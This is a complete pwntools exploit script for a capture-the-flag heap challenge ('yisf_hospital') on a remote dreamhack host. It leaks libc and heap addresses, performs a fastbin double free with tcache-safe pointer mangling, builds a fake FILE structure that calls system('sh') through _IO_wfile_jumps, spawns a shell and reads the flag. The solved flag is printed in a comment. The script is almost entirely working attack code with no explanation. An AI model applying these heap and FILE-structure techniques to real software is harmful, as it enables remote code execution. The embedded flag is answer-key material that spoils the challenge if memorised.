#!/usr/bin/env python3
from pwn import *
import binascii
import sys

exe_path = './yisf_hospital_patched'
HOST = 'host8.dreamhack.games'
PORT = 22885

exe = ELF(exe_path, checksec=False)
libc = exe.libc
context.binary = exe
context.terminal = [
    'cmd.exe', '/c', 'start',
    'wt.exe', '-w', '0', 'split-pane', '-V',
    '-d', '.',
    'wsl.exe',
    '-d', 'kali-linux',
    'bash', '-c'
]

gdbscript = '''
# break *0x401443
# b*0x4016ca
# b*0x401890
# b*0x4019c2
continue
'''

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    p = process(exe.path)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
        input()
    return p

p = start()

def sla(prompt, data):
    p.sendlineafter(prompt, data)
def sa(prompt, data):
    p.sendafter(prompt, data)
def s(prompt):
    p.send(prompt)
def sl(data):
    p.sendline(data)
def rcu(data):
    return p.recvuntil(data)
def rl():
    return p.recvline()

# ============================EXPLOIT============================
def add(idx, disease, name):
    sla(b"6. exit\n>>> ", b"1")
    sla(b">>> ", str(idx).encode())
    sa(b">>> ", disease)
    sa(b">>> ", name)
def cancel(idx):
    sla(b"6. exit\n>>> ", b"2")
    sla(b">>> ", str(idx).encode())
def edit(idx, disease, name):
    sla(b"6. exit\n>>> ", b"3")
    sla(b">>> ", str(idx).encode())
    sa(b">>> ", disease)
    sa(b">>> ", name)
def review(review):
    sla(b"6. exit\n>>> ", b"5")
    sa(b"> ", review)

def get_heap_base(leaked_data):
    s_shifted = leaked_data >> 12
    x = s_shifted ^ (s_shifted >> 12) ^ (s_shifted >> 24)
    return x << 12

sla(b">>> ", b"DTM{HELLO}")
# leak libc via small bin
for i in range(1, 11):
    add(i, b"A"*0x10, b"B"*0x8)
for i in range(4, 11, 1):
    cancel(i)


cancel(2)

review(b"C"*0x10)
edit(1, p64(0x22), b"C"*0x8)
sla(b">>> ", b"1")
sla(b">>> ", b"2")
sla(b">>> ", b"")
rcu(b"disease : ")
libc.address = u64(p.recv(6).ljust(8, b"\x00")) - 0x21ac0a
log.info(f"libc: {hex(libc.address)}")
sla(b">>> ", b"leaked!")

# leak heap via 2 fastbin chunk
cancel(3)
edit(1, p64(0x21), b"C"*0x8)
cancel(2)
edit(1, p64(0x22), b"C"*0x8)
sla(b">>> ", b"1")
sla(b">>> ", b"2")
sla(b">>> ", b"")
rcu(b"disease : ")
heap_base = get_heap_base(u64(p.recv(4).ljust(8, b"\x00")))
log.info(f"heap base: {hex(heap_base)}")
sla(b">>> ", b"leaked!")

# fastbin dup
for i in range(0x20):
    sla(b"6. exit\n>>> ", b"5")
edit(1, p64(0x21), b"C"*0x8)

# double free
cancel(1)
cancel(2)
cancel(1)
add(1, p64(0x404080 ^ (heap_base >> 12)), b"C"*8)
add(2, b"D"*0x10, b"E"*0x8)
add(3, b"F"*0x10, b"G"*0x8)
add(4, b"H"*0x10, p64(0x4040a8))

# 0x404 left in fastbin -> clean
# search -8 0x404 libc
fastbin = libc.address + 0x21ac90
edit(1, p64(0x404088) , p64(fastbin))

# restore reviewnum
edit(2, p64(0x0), b"\x00")
edit(4, p8(0x20)+p8(0), p64(0x0))
edit(4, p8(0), p64(0))

# fake FILE struct
target = heap_base + 0x8f0

system = libc.symbols['system']
fp = FileStructure()
fp.flags = 0xfbad2484 + (u32(b"||sh") << 32)
fp._IO_read_end = system
fp._lock = target + 0x50
fp._wide_data = target # fake FILE struct
fp.vtable = libc.symbols['_IO_wfile_jumps']
payload = bytes(fp) + p64(target + 0x10 - 0x68)

review(payload)

# edit pointer to overwrite stdout on bss
edit(1, p64(0x404000) , p8(0x0))
edit(2, b"A"*8 + p64(0x21), p8(0))

edit(1, p64(0x404010) , p8(0x0))
edit(1, p64(0x404028) , p8(0x0))
edit(2, p64(0x21), p8(0))

edit(1, p64(0x4040b0) , p64(0x0))
edit(2, p64(0x404010), p64(0x4040c0))

edit(1, p8(0x0) , p8(0x0))
cancel(3)
edit(2, b"A"*8 + p64(0x22), p8(0))

add(5, b"D"*0x8, p64(target))

sl(b"cat flag*")
# YISF{c4ll0c_15_700_d4n63r0u5_b3_c4r3ful_n07_70_c47ch_4_c0ld}

p.interactive()
